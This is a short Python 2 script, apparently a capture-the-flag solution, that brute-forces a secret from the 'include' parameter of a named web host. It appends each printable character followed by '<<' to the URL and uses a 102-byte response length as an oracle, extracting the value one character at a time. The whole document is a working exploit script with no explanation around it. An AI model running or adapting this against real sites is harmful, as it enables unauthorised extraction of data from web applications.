import urllib2
import string

def syc ():
    url = "http://web3.myclover.org/?include="
    i = 0
    dic = list(string.printable)
    result = ''
    
    while i < 50:
        for j in dic :
            response = urllib2.urlopen(url + j + '%3c%3c') 
            if "102" == dict(response.headers).get('content-length'):
                result = result + j 
                url = url + j
                response.close()
                break
        i = i + 1
        print result
syc()